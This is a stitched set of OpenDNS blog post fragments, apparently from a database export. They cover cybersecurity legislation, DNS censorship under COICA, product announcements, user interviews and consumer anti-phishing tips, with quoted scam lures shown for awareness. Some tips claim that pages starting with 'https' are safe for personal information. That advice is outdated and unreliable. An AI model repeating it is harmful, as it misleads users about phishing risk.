when sharing cybersecurity information with DHS and mandates “robust privacy oversight” to guarantee that the voluntarily shared information doesn’t hurt individual privacy and civil liberties.  We look forward to understanding more in that area.\nThe Bill proposes a three-step process around protecting critical infrastructure like the electricity grid and financial sector:\n1. Critical infrastructure operators would develop their own frameworks for addressing cyber threats.\n2. Then, each critical-infrastructure operator would have a third-party auditor assess its cybersecurity risk mitigation plan.\n3. A summary of the plan would be accessible, in order to facilitate transparency and to ensure that the plan is adequate.\nAccording to the Bill, in the event the process fails to produce strong frameworks, DHS, working with the National Institute of Standards and Technology (NIST), could modify a framework.  And DHS can also work with organizations to help them fix plans that are deemed insufficient by auditors.\nAs for “protecting Federal Government computers and networks,” the Bill will do a lot of different things. For one, it will formalize the responsibility of DHS to manage security for the Federal Government’s civilian computers. (It’s DHS’s responsibility today technically, but it’s not a formal relationship.) This includes also overseeing intrusion prevention systems for all Federal Executive Branch civilian computers.\nNot falling squarely into these three primary buckets but interesting nonetheless, the Bill will also prevent states from requiring technology companies build datacenters in that state, allowing companies a bit more operational flexibility than they have today.\nHow does this affect you and your privacy directly? The Bill specifically states certain privacy and civil liberty measures:\n– DHS would have to develop cybersecurity practices with help from and review by privacy and civil liberties experts and get them approved by the Attorney General.\n– All monitoring, collection, use, retention and sharing of information is limited to protecting against cybersecurity threats.\n– If a private-sector business, state, or local government wants to share information with DHS, it must first make reasonable efforts to remove identifying information unrelated to cybersecurity threats.\nMore about the bill from the Wall Street Journal and the LA Times.', 'Community', 'https://umbrella.cisco.com/blog/2011/05/13/cybersecurity-bill-explained/');

First, domains are submitted by you and thousands of people like you, to be grouped in one of our 56 different categories.

Once the domain reaches a vote threshold it’s moved into moderation.\nThis is where the OpenDNS Moderators come in.\nOnce the domain reaches the moderation queue, moderators are responsible for reviewing and making the final say about whether or not the domain belongs in the category.  They very carefully review the voting results, use their sound judgement and Internet excellency, and of course, visit the website itself before making a final call. If approved, the domain is then added to the category and blocked for all OpenDNS users who’ve enabled filtering of that category.\nSo who are these moderators and how do I become one?\nOpenDNS Moderators are invaluable to our users, and invaluable to Internet safety and security.

This week it’s the “Find out who visits your profile,” scam, which we’ve all seen before. The reason it piques my interest this time is the sheer volume of people falling victim. That coupled with the fact that the victims include some of my more tech-savvy Facebook friends made me want to understand better what exactly the virus is trying to do and how we can all protect ourselves.\nThe virus works first by gaining access to your Facebook account. Unlike other methods for hacking, which involve somehow accessing your login credentials, this scam needs only for you to click a link posted on your wall or someone else’s wall. To entice you into clicking, the scam offers something lots of people would love to know, but Facebook doesn’t allow: a list of people who’ve viewed your profile. You might receive an e-mail notification that tells you a friend has posted a link on your wall with this context:\n“LOL !! Me cant believe that you can see who is viewing your profile! I can see the TOP 10 people and I am really OPENMOUTHED that my EX is still checking my Pix and my Profile. You can also see WH0 CHECKS YOUR PR0FILE here)”\nThe most important thing to understand about this scam is that you should not click the link.  If you don’t click the link and opt-in, the virus is rendered powerless.  If you click the link, and you happen to be logged into your Facebook account when you do, the virus immediately goes to work posting the same link and content on your friends’ walls. There’s no way to stop it in progress – the only way to repair the damage is to visit each of your friends’ walls one-by-one and remove the post, or message all and hope they haven’t already clicked the link, as well.\nSince there’s an email component to the virus for those who’ve elected in their Facebook settings to be notified via email when someone posts to their wall, we’ve seen a surge in submissions of this scam to PhishTank, the anti-phishing clearinghouse we operate. However, this will not be confirmed as a phish because it acts entirely within Facebook. Note the domain for the below submission is Facebook’s: fb.me\n\nWithin social networks users are largely accountable for their own safety. The primary thing to remember: if you have any doubt, don’t click the link. Facebook offers this bit of advice:\n“Always use caution when clicking on a link or opening an attachment, even if it’s been sent or posted by a friend or other reputable source. If you have any doubt, get confirmation directly from the sender. Be especially wary of messages that include attractive offers or urgent requests, and watch out for links that require you to immediately provide a login and password.”', 'Community;Security 101', 'https://umbrella.cisco.com/blog/2011/05/05/facebook-who-views-your-profile-scam/');

Understanding why this is important is easy when you know two things:\nThe more servers and locations we have in operation, the more capacity we have. \nThe closer you are topologically to an OpenDNS server, the faster your DNS.\nToday we’re announcing a new datacenter location in Frankfurt, Germany.  Adding to our existing London and Amsterdam locations, the Frankfurt location helps make sure our DNS service is the fastest available to Internet users in Europe and provides much more overall capacity to European users (50% more).\nSetting up a datacenter for the largest open recursive DNS service in the world is actually a pretty fun part of the job since we don’t get to rack and stack gear very often.  While we have brought new sites online without ever setting foot onsite, by drop-shipping gear to a remote site and bringing it up from HQ, I was looking forward to a trip to Germany and volunteered to go and do the install myself.  As icing on the cake, David surprised me with a first class upgrade, which was an awesome experience.\nDoing a remote install?  Some travel tips…\nI’ve come up with a few tips for fellow operations folks who are doing remote installs:\nHave a solid deployment checklist of everything you want at the site.  That doesn’t just include routers, switches and servers, but everything you might need including screws, cage-nuts, power cables, extra power cables for your laptop, patch cables, couplers, adapters, SFPs, etc.\nSet up all your power at the datacenter and make sure it’s working before you leave.  Make sure you send your remotely manageable power distribution unit ahead of time.  Power plugs and configurations differ country by country and you want to make sure your power is lit and working long before you fly somewhere to do an install.  Despite the increased cost of a remotely managed power distribution unit, it will pay for itself after 1 or 2 remote-hands charges from your datacenter provider.\nIf you can avoid it, don’t book a flight until your gear has cleared customs.  Customs handling time varies by country and there is nothing worse than arriving on-site and not being able to access your gear.  We generally allocate about a week for customs in Europe, and a bit longer in Asia.  In more developing nations, it can vary wildly from days to months.\nAlways plan for extra days.  We prefer to schedule the installs to start on a Saturday or Sunday and then go into a Monday or Tuesday.  This way we have the weekend when the datacenter is not busy to do all the physical racking and stacking.  The on-site folks are more forgiving about making a mess usually, and often even offer to lend a hand.  By the time Monday morning comes around, everything is racked and powered, and we can now work with the various networking providers to bring circuits online with the regular on-duty techs.  There’s nothing wrong with finishing your install on a Monday and spending a couple days sightseeing.  Having the extra time gives you some buffer to fix any major hiccups that may happen, and to source a replacement part locally.\nThe last tip is probably the most important.  Take photos along the way, and at the end.  We love having photos of our install, which we archive in our Wiki.  This way, if we ever need to request remote-hands work from techs in the future, we don’t simply have to rely on labels on gear to figure things out.  We can actually describe the location of equipment or annotate instructions for them on complicated remote-hands work.\nI’ve included some photos of our install for you below.

The obvious exceptions are when we need to share data in order to provide a service you have asked for or that we require to run our service, or when we have to satisfy a legal mandate. But nobody can come to us and purchase a raw feed of the customer DNS traffic, we just aren’t interested in that business.\nSeparate from the DNS queries, OpenDNS works with vendors and partners to provide services to us (i.e. network monitoring software, email newsletter management) and to you (i.e. malware researchers). To perform these services we sometimes need to share specific pieces of personal information with them.  We’ve clarified when we do this and have explained that all are doing so at our request and are limited in their scope.\nYou should read and understand our new Privacy Policy, as I’ve only summarized pieces of it above.

In some cases, names were also connected to these email addresses. With a name and an email address, there’s a high potential to be spear phished.\nWhat’s spear phishing? It’s a phish that’s especially targeted to you. Instead of a mass email sent to everyone on a scammers list, a spear phish is targeted to you directly. It might address you by name, for example, or even look like it’s sent from a friend or family member. Phishes of this type can be especially tricky to identify, but by taking some extra precaution you can outsmart these Internet scammers.\nHere’s what to look for:\nForged link. Even if a link has a name you recognize somewhere in it, it doesn’t mean it links to the real organization. Roll your mouse over the link and see if it matches what appears in the email. If there is a discrepency, don’t click on the link. Also, websites where it is safe to enter personal information begin with “https” — the “s” stands for secure. If you don’t see “https” do not proceed.\nRequests personal information. The point of sending phishing email is to trick you into providing your personal information. If you receive an email requesting your personal information, it is probably a phishing attempt. You can always check out their claim safely by heading to your bank’s website and calling them or emailing them directly.\nSense of urgency. Internet criminals want you to provide your personal information now. They do this by making you think something has happened that requires you to act fast. The faster they get your information, the faster they can move on to another victim.\nOf course the absolute best thing you can do to protect yourself from phishing websites is to use OpenDNS. We block more than a half million phishing attempts each month for the people who use our services.

And while it still isn’t clear when and how .XXX will be implemented, it’s certainly of interest to those of us in the DNS and Web content filtering space.\nHere are some initial thoughts:\nThere is no incentive for an adult website to leave their .com domain and move to .xxx. Most sites will probably end up having both a .com and a .xxx domain, but there’s no reason for a successful adult website to move entirely over to .xxx. There may not even really be justification for a new adult site to make a home in .xxx.\n.xxx doesn’t make it much easier to block adult content, because even though an entire TLD can be filtered, it certainly won’t be comprehensive (see point #1).\nOverall, introducing .xxx now — instead of 11 years ago when first introduced, or even better, when the primary TLDs were created — will have little to no effect on the adult industry and their domain name TLD choices.\nThere’s a significant monetary aspect to adding .xxx as well. While most domains are $10 per year, .xxx domains will cost $60 to register. Certainly registrars have a vested interest in seeing .xxx approved for their own gain.

I report sites because I know I can help protect many people (friends of PhishTank) plus other sites… and there are a couple billion Internet users to help protect, with just one report.\nHow did you get involved in submitted scammy websites and emails to PhishTank?\nWell I have been using Opera (web browser) and I saw PhishTank as part of their anti-phishing protection, so I joined that and then I saw that PhishTank is owned by OpenDNS and started using that and saw a big difference in Internet speed.\nWhat’s the best phishing attempt you’ve come across in your time submitting content to PhishTank?\nI am lucky not to have gotten the big ones that a lot of others seem to get, but I have seen some Hotmail phishing scams that were sent from a Hotmail account. I have also been contacted via Facebook chat in hacked accounts by people I know I have not talked to on FB chat before. Sophos’ Naked Security has a lot of the Facebook scams before I see them (recently I have not seen any friends failing of them). I know what to look for and I can tell the user if their account is hacked to changed their password and to check the facebook apps they have.\nOn Twitter you go by ChasApple. Any funny stories about where that handle came from?\nDon’t remember where I got the idea for Chasapple but since Chas4 was taken already I went with Chasapple\nPlease tell us your favorite 1) gadget, 2) OS, 3) browser and 4) website?\n1) hard to pick a favorite gadget as they keep changing so often.\n2) Mac OS X\n3) Opera is my browser of choose as they have the new features first about a year before others (tabs, speeddail, etc)\n4) Favorite website would be my.opera.com as it is a great community as you can find interested people in any subject, from around the world, and the blogs post people have are about anything and everything and in many different languages\nInterested in answering five questions for the OpenDNS Blog?

In reviewing how we presented our data, it’s clear that we should have provided a few more datasets and some better explanations of where our data comes from for clarity.\nOne of the reasons PayPal is so prevalent as a target in PhishTank is because PayPal uses the PhishTank API to automatically submit any phish they find to PhishTank. This is a good thing — it puts data into PhishTank quickly so the community can verify the sites and PhishTank data feed subscribers can protect their users. While this highlights the frequency that PayPal is a target, it also skews the data to make it appear that PayPal, Inc. is the most phished site, simply because they are the most vigilant in submitting data to PhishTank. Obviously, this was not our intent. We’ve updated the report (PDF, Scribd) to show the most targeted brands in 2010 with the PayPal API data removed from the dataset, as nearly all other submissions come from the tens of thousands of PhishTank individual contributors.\nAs PhishTank continues to grow, we want to encourage other brands to follow PayPal’s lead in using the various PhishTank APIs to submit data alongside the submissions from individual users. In order to do that, we need to create an environment where brands don’t feel their participation in PhishTank is a double-edged sword. We sincerely appreciate PayPal’s participation in PhishTank, and in their fight against phishing. They should be commended for their progress in fighting phishing and keeping their users safe.\nIf the PayPal API-based submissions to PhishTank are removed from the dataset of phished brands, the list of most-targeted brands in 2010 shifts dramatically:\n1.

This type of failure didn’t trigger our monitoring system — because from our end, everything appeared online. Lasting approximately two hours in the early morning on the West Coast, the partial interruption in service was a localized one and did not affect the global OpenDNS service.\nWhen issues like this happen we always like to step back and try to understand what we could do to prevent these kinds of problems from happening again. In the coming days we will determine how we can detect this type of problem more quickly and how we can respond more effectively.\nTo reiterate: we value our customers, and we take incidents like this exceptionally seriously. And while a disruption in service is never a good thing, we’ll take this as an opportunity to learn, and to ensure we run the most robust and globally available DNS service on the planet.

Data collected on how people used Web content filtering in 2010 shows this fact: Facebook is the #1 most blacklisted site. And interestingly enough, it’s also the #2 most whitelisted site. Other sites that were frequently blocked include MySpace and YouTube.\nNot surprisingly, Facebook was also a frequent target of online scammers. When we analyzed submissions to Phishtank in 2010, we saw that Facebook was the second most frequent website targeted by phishing websites. The #1 target for 2010 — and throughout every month of the year — was PayPal. PayPal accounts for an incredible 45 percent of all online phishes.\nThese statistics and more can be found in a report we’re publishing today, all about the Web content filtering and phishing data we saw in 2010.

For the last decade industry executives have consistently focused on using the legal system to protect their aging business models rather than focusing on the innovations necessary to deliver the products and services consumers want.\nThe entertainment industry’s newest legal tactic, the “Combating Online Infringements and Counterfeits Act,” (COICA), sponsored by Senator Patrick Leahy, has been approved by the Senate Judiciary Committee. While Senator Ron Wyden exercised his right to place a hold on pending legislation — which will stop the bill from traveling to the Senate floor immediately — proponents of COICA can (and most assuredly will) reintroduce the measure the next time Congress convenes in 2011.\nThis bill is short but significant. For the first time, it will give the government the power to censor the Domain Name System (DNS), one of the most critical pieces of infrastructure for the Internet.\nThe DNS is like a global phonebook for the Internet: always running in the background and used anytime you do anything on the Internet, including sending email and browsing websites. It’s been running without government interference for the last 25 years and it has helped enable the tremendous economic growth and innovation the Internet has provided to the U.S. and the World over the last two decades.\nMy company provides DNS services, and in fact one of the many features of our service gives our customers the ability to block sites on their Internet connections. Parents and school administrators block sites they deem unsafe or inappropriate for their children, and business managers block sites they deem inappropriate for a work environment. Ironically, our existence and our technical innovations in the market helped to spawn the idea for the legislation in the first place by showing that blocking sites through the DNS is technically possible. While the technology being proposed is similar, the implementation couldn’t be more different from ours.\n\nCOICA would induce all Internet Service Providers, including the largest like Comcast and Verizon, to start censoring sites on a pair of blacklists: one published and maintained by the Department of Justice without judicial oversight, and the other by the Attorney General. Sites that have been in the past or could today be considered for these lists include Ebay, YouTube, Dropbox, Facebook, SoundCloud, Veoh, Rapidshare and many other popular Internet websites. A site is a potential target for these lists if infringement, or linking to infringement, might be considered “central” to the site. Worse yet, getting on the list is easy but getting off could be quite difficult as it’s not clear what process will be in place to get off the list, even when a listing is done in error. The consequences for a law-abiding business of being blacklisted would be extremely dire.\nThe differences between the services my company provides and what the government is proposing are stark. We have always operated our service in a way that provides choice and control to our millions of users and customers. What COICA proposes would induce, and in some cases, force ISPs — including yours — to block websites for you without your input. The Internet is a global phenomenon and at OpenDNS we serve a global audience with customers around the world. If we are forced to block something due to a mandate by the U.S. federal government it would impact all our users, not just those in the U.S. That’s a terrible precedent for the U.S. government to set.\nFurthermore, as we’ve seen with the ongoing Wikileaks.org saga, the government will try and utilize whatever resources it can to take sites offline. There is absolutely no need to arm them with a tool to automate it, let alone one that sits outside of any judicial review as COICA does.\nBlocking a domain name is black and white act, meaning that if the Justice Department decided that one aspect of a website was enough to make infringement “central” their only recourse would be to block the entire website rather than systematically removing the infringing portion. For many sites this would lead to massive censorship of data and speech that was non-infringing.\nIronically, because the legal definition of what facilitates copyright infringement is so broad, even the website published by the Department of Justice that they use to list infringing websites might meet the criteria for being blocked itself!\nFinally, the entertainment industry already has at its disposal ample legal remedy to enforce copyright infringement: The Digital Millennium Copyright Act (DMCA). The DMCA provides a mechanism for copyright holders to have infringing content on the Internet removed promptly without government enforcement. It also provides means of stopping sites that facilitate copyright infringing activity and was successfully used by the entertainment industry to shut down companies like Napster and Scour.\nThe legislation that will be considered by the Senate is not about stopping computer viruses, fighting terrorism, improving our economy or protecting children. The legislation being considered is about the US Government acting as the police force on behalf of the entertainment industry. If passed it could have far-reaching consequences on the Internet in the form of censorship, instability and economic damages.\nThe United States has many challenges to tackle and the Department of Justice, the Attorney General, and Congress should be focused on the many more important issues that face our nation rather than the demands of an aggressive entertainment industry lobbying effort.\nMore information about COICA can be found here: https://www.eff.org/coica', 'Uncategorized', 'https://umbrella.cisco.com/blog/2010/12/03/the-dangers-of-coica/');

Today we chat with Daniel Côté, who uses OpenDNS to protect his computer and iPad at home.\nTell us a little bit about yourself…\nI’m a professor of social work at a university in Ontario. When away from the classroom and computer, I have a personal trainer who keeps me fit. I like tech toys, so I use an iPad to track my fitness progress in a spreadsheet.\nWhere are you using OpenDNS? At home or in an office?\nI use OpenDNS at home for the moment, for both business and personal reasons. I do a lot of research in academic databases and journals online, so connecting to the internet in a fail-safe and efficient way is vital to my work. At home, my router has been redirected to OpenDNS so my iPad also connects to it for DNS services.\n2010 is going by so quickly. What’s the best thing that’s happened to you this year?\nHard to say in terms of events. Most fun purchase was a 27 inch iMac that is awesome in terms of performance and usability. Being able to work on full-size side-by-side documents in large format on screen really speeds up my efficiency. Opening up the box this summer felt like Christmas all over again.\nIf you were stranded on a desert island with only one tech toy, what would you keep?\nThat’s easy. With no phone service, my iPhone wouldn’t be helpful on a deserted island. I would say the iPad would be great to have. Working to the next level in Angry Birds and in Cut the Rope definitely would help pass the time. Now if only there were some sort of solar panel built into the iPad screen to recharge the unit, I could use it for years while stranded there, right?\nWhat’s the one gift you’d most like to get this holiday season?\nAside from health and well-being for my family and friends, I’d like to have an iPad kind of gizmo built into my vehicle as the main instrument panel.\nInterested in answering five questions for the OpenDNS Blog?

When it comes to DNS technology, OpenDNS is the best one to me.\nHow did you hear about OpenDNS?\nI’ve used OpenDNS since December 2007. A long time ago, I had managed servers with DNS, like BIND, but I was looking for a new way to improve security on the networks I manage … and the security of my students. I’m very happy to know about OpenDNS.\nYou actually teach students about using OpenDNS as well, right?\nYes. In Faculdades Santa Cruz, I teach about network security. OpenDNS is a very good way to improve security in business, student and, of course, home networks. To students, I show them how to use OpenDNS on every type of network.\nIf you weren’t involved in technology, what would you do?\nActually I’m involved in technology all the time, with commercial automation, networks security … and I contribute to congresses about free software.

OpenDNS for Managed Service Providers allows MSPs of any size a co-branded version of our popular OpenDNS Enterprise service to their customers.\nThis service was created out of demand from two different audiences — first, we have had a large number of MSPs express interest in reselling our OpenDNS Enterprise service to their customers.  Second, we have a number of businesses looking to purchase OpenDNS Enterprise but who aren’t looking to buy a large subscription (which is what our corporate sales team focuses on).  As a result, we now have a fully-integrated program for MSPs and a solution for our customers looking for a smaller or more tailored offering while still getting all of the OpenDNS Enterprise features.\nWe hear all the time that existing appliance-based solutions are prohibitively expensive and require site visits to install and often to manage. This isn’t ideal for the MSPs or for the clients.  We believe OpenDNS is now serving a critical need of IT solutions providers around the world with the advent of OpenDNS for Managed Service Providers.\nAs a cloud-based service with a significantly lower Total Cost of Ownership (TCO) than alternative security services, OpenDNS Enterprise helps MSPs lower overhead costs and time spent on-site at client locations, while giving their customers something they’ve been looking for — comprehensive Web content filtering, faster Internet, and phishing and Malware protection. OpenDNS Enterprise’s unique malware and botnet protection technology is unlike anything else available, providing a significant differentiator IT solutions providers can pass on to their clients.\nFinally, I want to provide a big thank you to the dozens of MSPs who have been testing this with us over the last 3-4 months as we made refinements to both the dashboard interfaces and the program itself.  We’re confident we have created a program that works well for all MSPs and are excited to make sure the program is a huge success.\nMore information about the OpenDNS for Managed Service Providers program is available here.

I am the director of technology at Rain in American Fork, Utah. I have a B.S. in Information Technology from Utah Valley University in Orem. My wife Karen and I share three wonderful children. In my spare time I enjoy being a father and flying single engine airplanes.\nHere at Rain, we are a full-service digital agency that specializes in desktop web and mobile application development. Basically, we are a bunch of geeks that happen to get paid to mess with cool technology. For us, OpenDNS is certainly a daily part of that technology.\nHow did you hear about OpenDNS?\nI heard about OpenDNS from a former co-worker about four years ago. At the time, our office Internet connection happened to use a residential grade cable service which presented abysmally slow DNS resolvers. After becoming aware of the service and giving it a try, making the switch to OpenDNS was an easy decision and we’ve never looked back.\nWhat’s your favorite OpenDNS feature (i.e. faster Internet, Web content filtering, etc) and why?\nWe whole heartedly love the faster Internet! Recently we upgraded our office to an enterprise grade optical carrier. One would think a fast pipe such as this would make carrier DNS service that much faster. It turns out that OpenDNS continues to resolve up to 40% faster than the carrier’s own servers. We are in love with the level of quality and performance that OpenDNS continues to provide.\nOn to the sillier questions… It’s getting to be the season where people start thinking about which gadgets and toys they want for the holidays. What gadget are you hoping to get this year?\nI *really* want an iPad.

Our customers include several Fortune 100 organizations, global iconic brands you love, and hundreds more that are globally distributed.\nFor those who do not know — OpenDNS Enterprise provides a cost-effective and efficient way to manage Internet access and security across multiple physical locations, easily deployed and managed over the Web.  With the availability of OpenDNS Enterprise, it is no longer necessary to purchase and maintain stodgy and costly filtering appliances at each of your sites.\nWhile we were excited about what we built, the proof of our success is in the numbers:\nThe renewal rate among OpenDNS Enterprise customers for the next subscription year is an unprecedented 98 percent.  Further, many OpenDNS Enterprise customers are subscribing to the service with multiple-year contracts (and saving money by doing so).\nWe have made great strides with OpenDNS Enterprise but we have barely scratched the surface of what we intend to deliver to customers.  I’ve been reviewing our roadmap for 2011 and can confidently say that I have never been more excited about the opportunity we have at OpenDNS to deliver a fantastic service to our customers.\nI feel privileged to work at OpenDNS and I feel honored that so many great companies have chosen to do business with us.

At home or elsewhere?\nI have used OpenDNS at home for years and when I was in a position at work to be able to decide on OpenDNS, I did that as well. We also recommend FamilyShield to our parents as a drop-dead simple content filtering solution to cover their laptops, desktops and iPod touch/iPads. I also recommended it to a friend who deployed it at his organization.\nWhat’s your favorite OpenDNS feature?\nMy favorite feature is the fact that I don’t have to buy a piece of hardware. We have a super fast fiber connection (Chattanooga is host to the fastest Internet in the USA with speeds available to a 1 Gb), so I try to limit the hardware we have onsite. We can run cloud-based applications that feel like they are stored locally. Deploying OpenDNS took all of around five minutes.

This happens for us just as frequently as it happens for everybody else but, in this case, the email looked convincing enough that we thought we’d share it here on the blog, along with some tips for detecting similarly polished phishing attempts in the future.\nHere’s a screencap of the email I received from Google AdWords notifying me that I need to log in to my account immediately to ensure our OpenDNS ads are running. I’ve highlighted some features the scammers used to make the email seem legitimate, along with some message details we used to confirm this email as a phishing attempt.\nFirst, the email uses the standard Google logo, fonts, and color scheme, along with the actual email address Google AdWords uses to send regular account notifications (adwords-noreply@google.com). It’s important to note that anyone can change the “reply-to” address of an email, so you should never use the reply-to or “from” email address to determine whether or not an email is legitimate.\nAt first glance, this seems like a real email from Google. Since I’m the guy who manages our AdWords campaign, I’m actually starting to get a little curious — did our ads turn off without my knowledge overnight?\nBut then I look closer. First, the body of the message has a few spelling and grammar mistakes — basic ones, like writing “cannot” as “can not,” and missing a few spaces between sentences. All stuff a large corporation (and their small army of proofreaders) would fix before sending this email out to the masses. I hover over the link “Click here to confirm that your campaigns are up and running 100% at this time.” to see where the link will take me — you should always check the URLs of links in emails before you click. Sure enough, it’s not a real Google website. Instead of a Web page at “google.com,” it wants to take me to a page hosted at “google-dn.com.” Now I know I’m definitely not clicking on that link!\nIn my email application, I click to view the message details. Just as I suspected, the email wasn’t sent by Google’s servers, but actually by “mail.wisenetworks.co.uk” — definitely not Google!\nBy now, I’m pretty confident that this email is a phishing scam. Still, I want to double-check, so I visit our AdWords account (not by clicking on the link in the email) and verify that everything is performing as it should, just as I suspected.

The college helps students who do not qualify for university to get a further education after completing high school. We have a wide range of subjects ranging from Farming Management to Information Technology. The Boland College group is made up out of six campuses all over the Western Cape Province.\nHow did Boland College start using OpenDNS? \nAbout two years ago we received funding from our Department of Education to improve our campus network. We installed fiber optic lines and now have a 410-PC-strong network. This also meant that each and every class had access to the Internet. This was fantastic in the begining, but soon the reality of students on the internet became apparent.\nI had to sit for hours and trawl through my proxy logs to find and see which porn sites and [filesharing] sites were being accessed by the students. I was slowly losing the battle. Having to manually create blacklists to block these sites was a major headache. In the end I just got fed up with it. Then I read an article in a local PC magazine. One of the guys explained an easy way to filter and manage your Internet use with out any fuss. They were explaining how OpenDNS worked.\nAnd so…\nThe next day I went to your website and had a quick browse. It could not believe my eyes! Here was the solution to my biggest problem. I created an account and started testing to see what was filtered. Amazingly everything I tried I could not get pass the block page.

The feeling in South Africa at that time was amazing, people were talking soccer everywhere and bragging about their best teams and how far they will go. Some people were driving with little flags on their cars to show their support for their teams. Sadly South Africa didn’t get very far. So I supported the Netherlands all the way ’til the finals.

He’s the subject of this week’s “Five Questions” installment.\nWhy did the Myersville Volunteer Fire Company decide to use OpenDNS?\nI wanted to reduce legal liability for having a wide-open Internet pipe in the firehouse by restricting adult-related traffic. We operate on some funding from the county along with donations from citizens, so we had to find a very inexpensive solution for web filtering.\nDid you have a Web content filtering solution in place prior to OpenDNS?\nNo. We just couldn’t afford other solutions. Additionally, since the IT infrastructure at the station is managed by volunteers, we did not want complex hardware or software that would need to be administered. Therefore, we had to find a solution that was “in the cloud”.\nHow did you get involved in volunteer firefighting? Do you have a different day job?\nAbout a year and a half ago, I was involved in a project with my day job (security official for the government) to modernize ambulance operations. As part of that job — and since I had no prior firefighting/EMS experience — I spent a week riding in an ambulance to understand how EMTs/Paramedics perform their duties. After that week, I was hooked so I signed up for the next available state training. One year later, I was a certified volunteer EMT for my home town of Myersville.\nWhat’s the typical call that comes in to the VFC?\nActually, there is no such thing as a typical call. In a single day, we could have a cardiac arrest, a person on the highway who had trouble breathing, a major car accident, and someone who got sick from new medication. The next day, the only call could be for the firefighters to put out a car fire.\nMac or PC?\nWhatever fits the need… ', 'Community', 'https://umbrella.cisco.com/blog/2010/09/08/five-questions-with-an-opendns-user-keith-young/');

In addition, it must demonstrate visionary leadership and show all the signs of being a long-standing and sustainable market leader – and its technology must be proven. We certainly meet their requirements. OpenDNS has delivered some of the most significant innovations the Domain Name System has seen in its 30 years and today, 1% of all Internet users in the world choose OpenDNS.\nBeing named a Technology Pioneer is the highest honor the Forum gives to technology companies. This year, there was extra-stiff competition; 330 companies from around the world were nominated. When we look at who’s been named a Technology Pioneer in years past, it’s a steller group: Google (2000), PayPal (2002), Twitter (2010), Mint (2009) and Sandisk (2001).\nWe’re pretty excited about some of the other companies who were named Technology Pioneers this year as well: Atlassian, Spotify and foursquare are three of the 31 companies selected.

Very innovative in the higher education field as we are expanding into online education and want to offer a vast array of cloud-based services to our students.\nHow did you find your way into IT? \nA friend of mine gave me an old Compaq PC back in 1996 I believe. It had Windows 95, 128 megs of memory and something like a 400 or 500 MHz CPU. Pretty much a door stop today. I played with that PC, upgrading hardware and Windows, until one day I literally blew it up. I added a new CD drive, hit the power button and the power supply literally popped and then the dreaded smoke. I quickly learned the phrase “let the smoke out.”\nI had realized at that point what I really wanted to do so I built another PC from scratch, took some courses and the rest is history as they say. From then to now has been an exciting path with constant learning, which never stops. I love IT and am very passionate about what I do. It is great to have a career you love and can make a good living in.\nWhat problems were you seeking to solve with OpenDNS? \nWe wanted an effective yet easy to manage and deploy solution to stop the general time wasting by employees and students on non-business related websites. We also wanted to have added protection from phishing and malware sites. We looked at hardware solutions but due to the geographical nature of our company that was too costly. We chose OpenDNS because of the cost (obviously), simplicity and great functionality of the service.\nFavorite gadget or tech toy?\nMy phone. The new Android powered phones are great devices. I am not a big Apple fan and I think the Android phones will definitely give the iPhone a big headache! Google rocks!\nIf someone was going to take a look at your Web surfing habits, what are your top five time-wasting Web sites? \nHummm… well first would be Facebook, chatting with friends and family. Then would probably have to be (as of recently) BP’s website following the progress in the Gulf. Then I would have to say IT related stuff (I know pretty stereotypical, I guess I am kind of geeky). I like to read online articles, check out new products and of course stay up on the latest mobile devices.

Between blog posts, gaming sites, Facebook updates and breaking news, there was a lot to take in. One thing you probably didn’t see — if you are on an OpenDNS-protected network — were Phishing attempts.\nSince we block these scammy and fraudulent Web sites, you might not realize how prevalent they are across the Internet. In July alone, we blocked almost one million phishing attempts. That’s how many times people on OpenDNS-protected networks saw the “phishing attempt blocked” page.\nEven with the work we do to make sure you’re protected from seeing phishing sites, we can’t always catch everything. If you ever see a Web site or receive an email and aren’t sure if it’s legitimate, we’ve got you covered:\nFive Easy Ways to Spot A Phishing Attempt\nPoor resolution: Phishing websites are often poor in quality, since they are created with urgency and have a short lifespan. If the resolution on a logo or in text strikes you as poor, be suspicious.\nForged URL: Even if a link has a name you recognize somewhere in it, it doesn’t mean it links to the real organization. Read URLs from right to left — the real domain is at the end of the URL. Also, websites where it is safe to enter personal information begin with “https” — the “s” stands for secure. If you don’t see “https” do not proceed. Look out for URLs that begin with an IP address, such as: http://12.34.56.78/firstgenericbank/account-update/ — these are likely phishes.\nGeneric greeting: Phishing emails are usually sent in large batches. To save time, Internet criminals use generic names like “First Bank Customer” so they don’t have to type all recipients’ names out and send emails one-by-one.\nRequests personal information: The point of sending phishing email is to trick you into providing your personal information. If you receive an email requesting your personal information, it is probably a phishing attempt.\nSense of urgency: Internet criminals want you to provide your personal information now. They do this by making you think something has happened that requires you to act fast. The faster they get your information, the faster they can move on to another victim.\nAs always, we’re going to continue working on finding ways to improve the Internet and make it safer and smarter for our customers.

Among the many (overly) hyped vulnerabilities set to be revealed is one the researcher claims threatens the security of “millions” of home routers. And according to the researcher, OpenDNS is not a fix.\nSince the vulnerability was first publicized, we’ve made several attempts to contact Craig Heffner, the researcher, and get more detail. We’ve phoned. We’ve emailed. We’ve contacted reporters who’ve spoken to the researcher and had their help connecting to the researcher. I’ve even Facebook messaged his coworkers.  I haven’t had a single reply.\nWhy the aggressive outreach from us? Because we want to be a fix. We work hard to make OpenDNS a solution to the many problems system administrators and security pros face. In fact, our entire service was designed to address the problems you want it to address.  The only information we have is that this deals with DNS Rebinding.  Fortunately, OpenDNS has secured users from DNS rebinding attacks for a long time.  But we don’t know what’s different about Craig’s new rebinding attack.\nWhen Dan Kaminsky and his firm IOActive famously revealed a major DNS flaw at the very same conference a few years ago, OpenDNS by then had worked to ensure that our service was secure and not threatened by the vulnerability. When the Conficker virus gained traction and proved it posed a real threat, security firm Kaspersky Labs and OpenDNS quickly teamed to block the domains from resolving for OpenDNS users. This sort of cooperation by industry leaders, groups and companies is, in my humble opinion, exemplary. It’s absolutely in the best interest of Internet users as it reduces the window of vulnerability.  And we’re always to happy to keep details of security issues secret, so the researcher can announce it without the risk of someone else stealing their thunder.\nCould OpenDNS be a fix to the vulnerability said to threaten millions of home routers? Probably, but I can’t say since I have no information about how it works.  All we know is that it has to do with DNS Rebinding attacks, which is a very old threat and is one we’ve done a great job of protecting users from in the past.  Is OpenDNS a fix as-is already? Can’t say that either.  It might be.  Or we might have to tweak something.  What I can say is that we have world-class engineers who are ready and willing to do whatever work possible to make OpenDNS a solution.

